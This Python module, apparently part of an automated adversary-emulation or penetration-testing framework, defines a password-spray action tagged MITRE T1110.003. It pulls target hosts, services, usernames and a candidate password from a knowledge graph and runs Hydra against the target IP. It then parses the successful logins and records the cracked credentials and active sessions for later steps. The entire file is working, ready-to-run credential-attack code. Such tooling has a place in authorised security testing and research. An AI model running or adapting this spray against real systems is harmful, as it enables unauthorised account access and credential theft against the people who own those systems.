import json

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class PasswordSprayAction(Action):
    """Password spray via Hydra: one password against known users on a service (SSH, FTP, etc.)."""

    def __init__(self):
        super().__init__("PasswordSpray", "T1110.003", "TA0006", ["noisy", "fast"])
        self.noise = 0.8
        self.impact = 0.7
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """Asset + OpenPort + Service + User + Credentials (password)."""
        input_motif = ActionInputMotif(
            name="InputMotif_PasswordSprayAction",
            description="Input motif for PasswordSprayAction"
        )

        input_motif.add_template(
            template_name="existing_asset",
            entity=Entity('Asset', alias='asset'),
        )

        input_motif.add_template(
            template_name="existing_port",
            entity=Entity('OpenPort', alias='port'),
            match_on="existing_asset",
            relationship_type="has",
            invert_relationship=True,
        )

        input_motif.add_template(
            template_name="existing_service",
            entity=Entity('Service', alias='service'),
            match_on="existing_port",
            relationship_type="is_running",
            invert_relationship=True,
        )

        input_motif.add_template(
            template_name="existing_user",
            entity=Entity('User', alias='users'),
            match_on="existing_service",
            relationship_type="is_client",
        )

        input_motif.add_template(
            template_name="spray_password",
            entity=Entity('Credentials', alias='credentials'),
            expected_attributes=["password"],
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """Credentials, User, Session for successful logins (linked to Service)."""
        output_motif = ActionOutputMotif(
            name="OutputMotif_PasswordSprayAction",
            description="Output motif for PasswordSprayAction"
        )

        output_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="discovered_credentials",
            match_on=Entity('Service'),
            relationship_type='secured_with',
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        output_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="discovered_user",
            match_on=Entity('Service'),
            relationship_type='is_client',
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        output_motif.add_template(
            entity=Entity('Session', alias='session'),
            template_name="discovered_session",
            match_on=Entity('Service'),
            relationship_type='executes_on',
            expected_attributes=["id", "username", "password", "protocol", "active"],
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        users_ent = pattern.get("users")
        count = len(users_ent.get("entities")) if users_ent and users_ent.get("entities") else 0
        return [
            f"Try password '{pattern.get('credentials').get('password')}' against {count} user(s) "
            f"on {pattern.get('service').get('protocol')} service ({pattern.get('service')._id}) "
            f"on {pattern.get('asset').get('ip_address')}"
        ]

    def get_target_query(self) -> Query:
        """Service + User + Credentials (password). One pattern per (service, user, password)."""
        query = self.input_motif.get_query()
        service = self.input_motif.get_template('existing_service').entity
        creds = self.input_motif.get_template('spray_password').entity
        usr = self.input_motif.get_template('existing_user').entity
        query.where(service.protocol.is_not_null())
        query.where(creds.password.is_not_null())
        query.where(creds.password != "")
        query.where(usr.username.is_not_null())
        query.where(usr.username != "")
        query.carry(
            "asset, port, service, collect(DISTINCT users) AS users, collect(credentials)[0] AS credentials"
        )
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Run Hydra: one password against all users for the service (one run per service)."""
        service = pattern.get("service")
        protocol = service.get("protocol")
        password = pattern.get("credentials").get("password")
        if not protocol:
            raise ValueError("Service has no protocol")

        users_ent = pattern.get("users")
        user_list = users_ent.get("entities") if users_ent else []
        seen: set[str] = set()
        usernames = []
        for user in user_list or []:
            name = user.get("username") or user.get("name")
            if name and name != "anonymous" and name not in seen:
                seen.add(name)
                usernames.append(name)

        if not usernames:
            return ActionExecutionResult(
                command=["noop"],
                stdout="no valid users in pattern; skipping",
                exit_status=0,
                artefacts={},
            )

        users_path = artefacts.get_path(artefacts.placeholder("password_spray_users.lst"))
        pass_path = artefacts.get_path(artefacts.placeholder("password_spray_password.lst"))
        out_uuid = artefacts.placeholder("password-spray-output.json")
        out_path = artefacts.get_path(out_uuid)
        with open(users_path, "w") as f:
            f.write("\n".join(usernames) + "\n")
        with open(pass_path, "w") as f:
            f.write(f"{password}\n")

        execres = shell(
            "hydra",
            ["-L", str(users_path), "-P", str(pass_path), "-o", str(out_path), "-b", "json", f"{protocol}://{pattern.get('asset').get('ip_address')}"],
        )
        execres.artefacts["scan_results_json"] = out_uuid
        return execres

    def parse_output(self, output: ActionExecutionResult, artefacts: ArtefactManager) -> dict:
        """Extract successful logins from Hydra JSON output."""
        with artefacts.open(output.artefacts["scan_results_json"], 'r') as f:
            results = json.load(f)
        creds = [
            {"username": r["login"], "password": r["password"]}
            for r in results.get("results", [])
            if r.get("login") and r.get("password")
        ]
        return {"discovered_credentials": creds}

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """Update/create Credentials (by pattern uuid or service+user), User, Session."""
        self.output_motif.reset_context()
        service = pattern.get('service')
        protocol = service.get('protocol')
        pattern_creds = pattern.get('credentials')

        changes: StateChangeSequence = []
        for cred_data in discovered_data["discovered_credentials"]:
            username = cred_data["username"]
            password = cred_data["password"]
            creds_entity = Entity("Credentials", alias="creds", username=username, password=password)
            # Update the Credentials node we sprayed with (by uuid) or by (service, username)
            match_creds = (
                Entity("Credentials", alias="creds", uuid=pattern_creds.get("uuid"))
                if pattern_creds and pattern_creds.get("uuid")
                else Entity("Credentials", alias="creds", username=username)
            )
            creds_match = match_creds - Relationship("secured_with") - service
            changes.append((creds_match, "update", creds_entity))
            changes.append(self.output_motif.instantiate("discovered_credentials", match_on_override=service, username=username, password=password))
            changes.append(self.output_motif.instantiate("discovered_user", match_on_override=service, username=username))
            changes.append(self.output_motif.instantiate(
                "discovered_session",
                match_on_override=service,
                id=f"spray_{username}_{protocol}",
                username=username,
                password=password,
                protocol=protocol,
                active=True,
            ))
        return changes

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """Parse Hydra output and apply Credentials/User/Session changes."""
        return self.populate_output_motif(pattern, self.parse_output(output, artefacts))
